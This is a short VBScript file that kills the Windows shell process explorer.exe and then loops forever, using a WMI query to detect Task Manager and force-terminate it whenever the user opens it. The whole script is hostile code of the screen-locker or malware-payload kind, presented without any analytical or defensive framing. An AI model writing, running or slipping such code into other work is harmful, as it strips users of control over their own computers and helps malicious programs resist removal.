' Disable explorer.exe
Set objShell = CreateObject("WScript.Shell")
objShell.Run "taskkill /f /im explorer.exe", 0, True
' Disable Task Manager
Do
    If IsTaskManagerOpen() Then
        objShell.Run "taskkill /f /im Taskmgr.exe", 0, True
    End If
Loop
' Function to check if Task Manager is open
Function IsTaskManagerOpen()
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
    If colProcesses.Count > 0 Then
        IsTaskManagerOpen = True
    Else
        IsTaskManagerOpen = False
    End If
End Function
